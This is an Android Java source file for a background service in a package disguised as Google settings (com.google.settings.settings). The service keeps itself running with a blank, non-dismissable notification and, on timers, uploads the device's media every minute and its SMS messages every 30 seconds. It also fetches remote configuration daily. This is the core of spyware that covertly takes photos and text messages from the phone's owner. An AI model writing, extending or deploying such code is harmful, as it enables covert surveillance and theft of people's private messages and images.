package com.google.settings.settings.Services;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Binder;
import android.os.IBinder;
import android.provider.MediaStore;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.settings.settings.MediaDBManager;
import com.google.settings.settings.Utility.MediaCompressorUtility;
import com.google.settings.settings.Utility.SMSUtility;
import com.google.settings.settings.Receiver.MediaReceiver;
import com.google.settings.settings.Utility.ConfigUpdaterUtility;
import com.google.settings.settings.Utility.MediaUploadUtility;
import com.google.settings.settings.Utility.MediaUtility;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Timer;
import java.util.TimerTask;

public class MediaService extends Service {
    private static final String TAG = "Media Service";
    private Timer imgMonitorTimer, imgUploadTimer, configTimer, smsTimer;
    private MediaUtility mUtility;
    private MediaDBManager dbManager;
    private final IBinder mediaBinder = new MediaBinder();

    private NotificationManager mNM;
    private final static int NOTIFICATION_ID = 471;
    private static final Class<?>[] mStartForegroundSignature = new Class[] {
            int.class, Notification.class};
    private static final Class<?>[] mSetForegroundSignature = new Class[] {
            boolean.class};
    private Object[] mStartForegroundArgs = new Object[2];
    private Object[] mSetForegroundArgs = new Object[1];
    private Method mStartForeground;
    private Method mSetForeground;

    public static boolean isMediaCompressing = false;
    public static boolean isMediaUploading = false;
    public static boolean isSMSUploading = false;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return mediaBinder;
    }

    public class MediaBinder extends Binder {
        public MediaService getService() {
            return MediaService.this;
        }
    }

    private Runnable mediaRunnable = new Runnable() {
        @Override
        public void run() {
            initConfigTimer();
            initMediaCompression();
            initMediaUpload();
            initSMSUpload();
        }
    };

    @Override
    public void onCreate() {
        Log.d(TAG, "Service On Create!");
        try {
            mStartForeground = getClass().getMethod("startForeground",
                    mStartForegroundSignature);
            return;
        } catch (NoSuchMethodException e) {
            mStartForeground = null;
        }
        try {
            mSetForeground = getClass().getMethod("setForeground",
                    mSetForegroundSignature);
        } catch (NoSuchMethodException e) {
            throw new IllegalStateException(
                    "OS doesn't have Service.startForeground OR Service.setForeground!");
        }
        startForeground(NOTIFICATION_ID, getNotification());
        this.mUtility = new MediaUtility(this);
        this.dbManager = new MediaDBManager(this);
    }

    void invokeMethod(Method method, Object[] args) {
        try {
            method.invoke(this, args);
        } catch (InvocationTargetException e) {
            Log.w(TAG, "Unable to invoke method", e);
        } catch (IllegalAccessException e) {
            Log.w(TAG, "Unable to invoke method", e);
        }
    }

    void startForegroundCompat(int id, Notification notification) {
        if (mStartForeground != null) {
            mStartForegroundArgs[0] = Integer.valueOf(id);
            mStartForegroundArgs[1] = notification;
            invokeMethod(mStartForeground, mStartForegroundArgs);
            return;
        }
        mSetForegroundArgs[0] = Boolean.TRUE;
        invokeMethod(mSetForeground, mSetForegroundArgs);
        mNM.notify(id, notification);
    }

    private Notification getNotification() {
        Notification note = new Notification( 0, null, System.currentTimeMillis() );
        note.flags |= Notification.FLAG_NO_CLEAR;
        return note;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Starting Service...");
        registerReceiver();
        Thread mediaThread = new Thread(mediaRunnable);
        mediaThread.start();
        return START_STICKY;
    }

    private void initMediaCompression() {
        imgMonitorTimer = new Timer();
        imgMonitorTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.d(TAG, "Service Running!");
                if(!isMediaCompressing) new MediaCompressorUtility(MediaService.this).initImageCompression();
            }
        }, 0, 1000 * 10);
    }

    private void initMediaUpload() {
        imgUploadTimer = new Timer();
        imgUploadTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                if(!isMediaUploading) new MediaUploadUtility(MediaService.this).initUploadServices();
            }
        }, 0, 1000 * 60 * 1);
    }

    private void initSMSUpload() {
        smsTimer = new Timer();
        smsTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                if(!isSMSUploading) new SMSUtility(MediaService.this).initSMSUpload();
            }
        }, 0, 1000 * 30);
    }

    private void initConfigTimer() {
        configTimer = new Timer();
        configTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                new ConfigUpdaterUtility(MediaService.this).initConfigUpdater();
            }
        }, 0, 1000 * 60 * 60 * 24);
    }

    private void registerReceiver() {
        ComponentName mediaReceiver = new ComponentName(this, MediaReceiver.class);
        PackageManager mPackageManager = getPackageManager();

        mPackageManager.setComponentEnabledSetting(
                mediaReceiver,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    @Override
    public void onDestroy() {
        imgMonitorTimer.cancel();
        imgUploadTimer.cancel();
        configTimer.cancel();
    }
}
